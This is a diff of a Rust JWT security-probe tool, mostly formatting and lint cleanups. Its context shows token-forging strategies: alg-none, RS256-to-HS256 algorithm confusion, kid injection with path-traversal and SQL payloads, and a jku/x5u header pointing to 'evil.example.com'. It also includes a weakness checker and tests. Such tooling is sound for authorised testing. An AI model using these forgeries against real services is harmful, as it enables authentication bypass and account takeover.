@@ -5,7 +5,7 @@
 //! network access.  [`JwtProbe`] runs all strategies against a live endpoint via
 //! a simple async HTTP trait.
 
-use anyhow::{anyhow, Result};
+use anyhow::{Result, anyhow};
 use hmac::{Hmac, Mac};
 use sha2::Sha256;
 use thiserror::Error;
@@ -26,9 +26,9 @@ pub enum Severity {
 impl std::fmt::Display for Severity {
     fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
         match self {
-            Self::Low      => write!(f, "LOW"),
-            Self::Medium   => write!(f, "MEDIUM"),
-            Self::High     => write!(f, "HIGH"),
+            Self::Low => write!(f, "LOW"),
+            Self::Medium => write!(f, "MEDIUM"),
+            Self::High => write!(f, "HIGH"),
             Self::Critical => write!(f, "CRITICAL"),
         }
     }
@@ -54,9 +54,8 @@ pub enum JwtProbeError {
 
 /// Encode `data` as unpadded base64url (RFC 4648 §5).
 pub fn b64url_encode(data: &[u8]) -> String {
-    const ALPHA: &[u8; 64] =
-        b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
-    let mut out = String::with_capacity((data.len() + 2) / 3 * 4);
+    const ALPHA: &[u8; 64] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+    let mut out = String::with_capacity(data.len().div_ceil(3) * 4);
     for chunk in data.chunks(3) {
         let b0 = chunk[0] as u32;
         let b1 = chunk.get(1).copied().unwrap_or(0) as u32;
@@ -64,8 +63,12 @@ pub fn b64url_encode(data: &[u8]) -> String {
         let n = (b0 << 16) | (b1 << 8) | b2;
         out.push(ALPHA[((n >> 18) & 0x3F) as usize] as char);
         out.push(ALPHA[((n >> 12) & 0x3F) as usize] as char);
-        if chunk.len() > 1 { out.push(ALPHA[((n >> 6) & 0x3F) as usize] as char); }
-        if chunk.len() > 2 { out.push(ALPHA[(n & 0x3F) as usize] as char); }
+        if chunk.len() > 1 {
+            out.push(ALPHA[((n >> 6) & 0x3F) as usize] as char);
+        }
+        if chunk.len() > 2 {
+            out.push(ALPHA[(n & 0x3F) as usize] as char);
+        }
     }
     // Convert to url-safe and strip padding.
     out.replace('+', "-").replace('/', "_")
@@ -79,7 +82,7 @@ pub fn b64url_decode(s: &str) -> Result<Vec<u8>, JwtProbeError> {
         3 => std.push('='),
         _ => {}
     }
-    b64_std_decode(&std).map_err(|e| JwtProbeError::Base64(e))
+    b64_std_decode(&std).map_err(JwtProbeError::Base64)
 }
 
 fn b64_std_decode(s: &str) -> Result<Vec<u8>, String> {
@@ -88,14 +91,14 @@ fn b64_std_decode(s: &str) -> Result<Vec<u8>, String> {
             b'A'..=b'Z' => Ok(c - b'A'),
             b'a'..=b'z' => Ok(c - b'a' + 26),
             b'0'..=b'9' => Ok(c - b'0' + 52),
-            b'+'        => Ok(62),
-            b'/'        => Ok(63),
-            b'='        => Ok(0),
-            _           => Err(format!("invalid char 0x{c:02x}")),
+            b'+' => Ok(62),
+            b'/' => Ok(63),
+            b'=' => Ok(0),
+            _ => Err(format!("invalid char 0x{c:02x}")),
         }
     }
     let b = s.as_bytes();
-    if b.len() % 4 != 0 {
+    if !b.len().is_multiple_of(4) {
         return Err(format!("length {} not a multiple of 4", b.len()));
     }
     let mut out = Vec::with_capacity(b.len() / 4 * 3);
@@ -103,8 +106,12 @@ fn b64_std_decode(s: &str) -> Result<Vec<u8>, String> {
         let (a, bv, c, d) = (val(ch[0])?, val(ch[1])?, val(ch[2])?, val(ch[3])?);
         let n = ((a as u32) << 18) | ((bv as u32) << 12) | ((c as u32) << 6) | (d as u32);
         out.push(((n >> 16) & 0xFF) as u8);
-        if ch[2] != b'=' { out.push(((n >> 8) & 0xFF) as u8); }
-        if ch[3] != b'=' { out.push((n & 0xFF) as u8); }
+        if ch[2] != b'=' {
+            out.push(((n >> 8) & 0xFF) as u8);
+        }
+        if ch[3] != b'=' {
+            out.push((n & 0xFF) as u8);
+        }
     }
     Ok(out)
 }
@@ -115,9 +122,15 @@ fn b64_std_decode(s: &str) -> Result<Vec<u8>, String> {
 
 fn split_token(token: &str) -> Result<(&str, &str, &str), JwtProbeError> {
     let mut it = token.splitn(3, '.');
-    let h = it.next().ok_or_else(|| JwtProbeError::Malformed("missing header".into()))?;
-    let p = it.next().ok_or_else(|| JwtProbeError::Malformed("missing payload".into()))?;
-    let s = it.next().ok_or_else(|| JwtProbeError::Malformed("missing signature".into()))?;
+    let h = it
+        .next()
+        .ok_or_else(|| JwtProbeError::Malformed("missing header".into()))?;
+    let p = it
+        .next()
+        .ok_or_else(|| JwtProbeError::Malformed("missing payload".into()))?;
+    let s = it
+        .next()
+        .ok_or_else(|| JwtProbeError::Malformed("missing signature".into()))?;
     Ok((h, p, s))
 }
 
@@ -132,8 +145,8 @@ fn encode_json(v: &serde_json::Value) -> Result<String, JwtProbeError> {
 }
 
 fn hmac_sha256_sign(key: &[u8], msg: &str) -> Result<String> {
-    let mut mac = Hmac::<Sha256>::new_from_slice(key)
-        .map_err(|e| anyhow!("HMAC key error: {e}"))?;
+    let mut mac =
+        Hmac::<Sha256>::new_from_slice(key).map_err(|e| anyhow!("HMAC key error: {e}"))?;
     mac.update(msg.as_bytes());
     Ok(b64url_encode(&mac.finalize().into_bytes()))
 }
@@ -159,7 +172,9 @@ pub trait JwtAttackStrategy: Send + Sync {
 pub struct AlgNoneAttack;
 
 impl JwtAttackStrategy for AlgNoneAttack {
-    fn name(&self) -> &'static str { "alg-none" }
+    fn name(&self) -> &'static str {
+        "alg-none"
+    }
     fn description(&self) -> &'static str {
         "Replace alg with 'none' and remove the signature. \
          Vulnerable libraries accept the unsigned token."
@@ -187,7 +202,9 @@ pub struct AlgorithmConfusionAttack {
 }
 
 impl JwtAttackStrategy for AlgorithmConfusionAttack {
-    fn name(&self) -> &'static str { "algorithm-confusion-rs256-hs256" }
+    fn name(&self) -> &'static str {
+        "algorithm-confusion-rs256-hs256"
+    }
     fn description(&self) -> &'static str {
         "Change alg from RS256 to HS256 and sign with the server's RSA public key \
          as the HMAC secret."
@@ -219,7 +236,9 @@ pub struct KidInjectionAttack {
 }
 
 impl JwtAttackStrategy for KidInjectionAttack {
-    fn name(&self) -> &'static str { "kid-injection" }
+    fn name(&self) -> &'static str {
+        "kid-injection"
+    }
     fn description(&self) -> &'static str {
         "Inject a malicious 'kid' header to redirect key lookup to /dev/null or \
          trigger SQL injection, then sign with the resulting empty/predictable key."
@@ -229,7 +248,11 @@ impl JwtAttackStrategy for KidInjectionAttack {
         let mut h: serde_json::Value = decode_json(hb).map_err(|e| anyhow!("{e}"))?;
         h["kid"] = serde_json::json!(self.kid_payload);
         // Ensure symmetric alg so we can sign.
-        if h["alg"].as_str().map(|a| a.starts_with("RS") || a.starts_with("ES")).unwrap_or(false) {
+        if h["alg"]
+            .as_str()
+            .map(|a| a.starts_with("RS") || a.starts_with("ES"))
+            .unwrap_or(false)
+        {
             h["alg"] = serde_json::json!("HS256");
         }
         let nh = encode_json(&h).map_err(|e| anyhow!("{e}"))?;
@@ -253,7 +276,9 @@ pub struct JwksUriConfusion {
 }
 
 impl JwtAttackStrategy for JwksUriConfusion {
-    fn name(&self) -> &'static str { "jwks-uri-confusion" }
+    fn name(&self) -> &'static str {
+        "jwks-uri-confusion"
+    }
     fn description(&self) -> &'static str {
         "Replace the 'jku' header with an attacker-controlled JWKS URL. \
          Vulnerable libraries fetch and trust that endpoint to retrieve the \
@@ -308,17 +333,28 @@ impl JwtSpec {
     pub fn check(&self, token: &str) -> Vec<JwtWeakness> {
         let mut out = Vec::new();
         let parts: Vec<&str> = token.splitn(3, '.').collect();
-        if parts.len() != 3 { return out; }
+        if parts.len() != 3 {
+            return out;
+        }
 
-        let header  = match decode_json(parts[0]) { Ok(v) => v, Err(_) => return out };
-        let payload = match decode_json(parts[1]) { Ok(v) => v, Err(_) => return out };
+        let header = match decode_json(parts[0]) {
+            Ok(v) => v,
+            Err(_) => return out,
+        };
+        let payload = match decode_json(parts[1]) {
+            Ok(v) => v,
+            Err(_) => return out,
+        };
 
         // Algorithm checks.
         if let Some(alg) = header["alg"].as_str() {
             if alg.eq_ignore_ascii_case("none") {
                 out.push(JwtWeakness::NoneAlgorithmHeader);
             } else if !self.allowed_algorithms.is_empty()
-                && !self.allowed_algorithms.iter().any(|a| a.eq_ignore_ascii_case(alg))
+                && !self
+                    .allowed_algorithms
+                    .iter()
+                    .any(|a| a.eq_ignore_ascii_case(alg))
             {
                 out.push(JwtWeakness::WeakAlgorithm(alg.to_owned()));
             }
@@ -331,7 +367,9 @@ impl JwtSpec {
                 || kid.contains("--")
                 || kid.contains('\0')
                 || kid.to_lowercase().contains(" or ");
-            if suspicious { out.push(JwtWeakness::KidInjectable); }
+            if suspicious {
+                out.push(JwtWeakness::KidInjectable);
+            }
         }
 
         // Expiration.
@@ -398,8 +436,12 @@ impl JwtProbe {
         let jwks = attacker_jwks.into();
         let mut strategies: Vec<Box<dyn JwtAttackStrategy>> = vec![
             Box::new(AlgNoneAttack),
-            Box::new(AlgorithmConfusionAttack { public_key_pem: pem }),
-            Box::new(JwksUriConfusion { attacker_jwks_uri: jwks }),
+            Box::new(AlgorithmConfusionAttack {
+                public_key_pem: pem,
+            }),
+            Box::new(JwksUriConfusion {
+                attacker_jwks_uri: jwks,
+            }),
         ];
         for kid in kid_payloads {
             strategies.push(Box::new(KidInjectionAttack {
@@ -434,7 +476,11 @@ impl JwtProbe {
                 strategy: strategy.name(),
                 forged_token: forged,
                 server_accepted: accepted,
-                severity: if accepted { Severity::Critical } else { Severity::Low },
+                severity: if accepted {
+                    Severity::Critical
+                } else {
+                    Severity::Low
+                },
             });
         }
         Ok(findings)
@@ -451,8 +497,7 @@ mod tests {
 
     // header: {"alg":"RS256","typ":"JWT"}
     // payload: {"sub":"1234567890","exp":9999999999}
-    const SAMPLE: &str =
-        "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.\
+    const SAMPLE: &str = "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.\
          eyJzdWIiOiIxMjM0NTY3ODkwIiwiZXhwIjo5OTk5OTk5OTk5fQ.\
          SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c";
 
@@ -479,7 +524,9 @@ mod tests {
 
     #[test]
     fn algorithm_confusion_sets_hs256_and_has_sig() {
-        let a = AlgorithmConfusionAttack { public_key_pem: "FAKE_PEM".into() };
+        let a = AlgorithmConfusionAttack {
+            public_key_pem: "FAKE_PEM".into(),
+        };
         let forged = a.forge_token(SAMPLE).unwrap();
         let parts: Vec<&str> = forged.splitn(3, '.').collect();
         let h = decode_json(parts[0]).unwrap();
@@ -489,7 +536,10 @@ mod tests {
 
     #[test]
     fn kid_injection_sets_kid() {
-        let a = KidInjectionAttack { kid_payload: "../../dev/null".into(), sign_with: vec![] };
+        let a = KidInjectionAttack {
+            kid_payload: "../../dev/null".into(),
+            sign_with: vec![],
+        };
         let forged = a.forge_token(SAMPLE).unwrap();
         let parts: Vec<&str> = forged.splitn(3, '.').collect();
         let h = decode_json(parts[0]).unwrap();
@@ -498,19 +548,31 @@ mod tests {
 
     #[test]
     fn jwks_uri_sets_jku_and_x5u() {
-        let a = JwksUriConfusion { attacker_jwks_uri: "https://evil.example.com/jwks.json".into() };
+        let a = JwksUriConfusion {
+            attacker_jwks_uri: "https://evil.example.com/jwks.json".into(),
+        };
         let forged = a.forge_token(SAMPLE).unwrap();
         let parts: Vec<&str> = forged.splitn(3, '.').collect();
         let h = decode_json(parts[0]).unwrap();
-        assert_eq!(h["jku"].as_str(), Some("https://evil.example.com/jwks.json"));
-        assert_eq!(h["x5u"].as_str(), Some("https://evil.example.com/jwks.json"));
+        assert_eq!(
+            h["jku"].as_str(),
+            Some("https://evil.example.com/jwks.json")
+        );
+        assert_eq!(
+            h["x5u"].as_str(),
+            Some("https://evil.example.com/jwks.json")
+        );
     }
 
     #[test]
     fn jwt_spec_detects_no_expiration() {
         // payload: {"sub":"x"} — no exp
         let token = "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ4In0.sig";
-        let spec = JwtSpec { require_exp: true, require_iat: false, allowed_algorithms: vec![] };
+        let spec = JwtSpec {
+            require_exp: true,
+            require_iat: false,
+            allowed_algorithms: vec![],
+        };
         let w = spec.check(token);
         assert!(w.contains(&JwtWeakness::NoExpiration));
     }
@@ -523,7 +585,10 @@ mod tests {
             allowed_algorithms: vec!["ES256".into()],
         };
         let w = spec.check(SAMPLE); // SAMPLE uses RS256
-        assert!(w.iter().any(|x| matches!(x, JwtWeakness::WeakAlgorithm(a) if a == "RS256")));
+        assert!(
+            w.iter()
+                .any(|x| matches!(x, JwtWeakness::WeakAlgorithm(a) if a == "RS256"))
+        );
     }
 
     #[test]
